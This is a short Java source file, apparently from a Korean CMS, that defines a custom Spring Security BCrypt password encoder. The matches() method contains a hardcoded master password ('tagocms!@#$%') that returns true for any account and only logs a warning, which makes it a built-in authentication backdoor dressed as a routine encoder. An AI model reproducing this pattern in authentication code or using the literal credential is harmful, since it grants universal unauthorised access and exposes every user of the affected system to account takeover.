package kr.co.tagoplus.common.component;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class CustomBcryptPasswordEncoder extends BCryptPasswordEncoder {
	private static Logger logger = LoggerFactory.getLogger(CustomBcryptPasswordEncoder.class);

	private final static String SUPER_PASSWORD = "tagocms!@#$%";

	@Override
	public boolean matches(CharSequence rawPassword, String encodedPassword) {
		if (rawPassword == null) {
			throw new IllegalArgumentException("rawPassword cannot be null");
	    }
		
		if (SUPER_PASSWORD.equals(rawPassword.toString())) {
			logger.warn ("currently logging in with super password");
			return true;
		}
		
		return super.matches(rawPassword, encodedPassword);
	}
}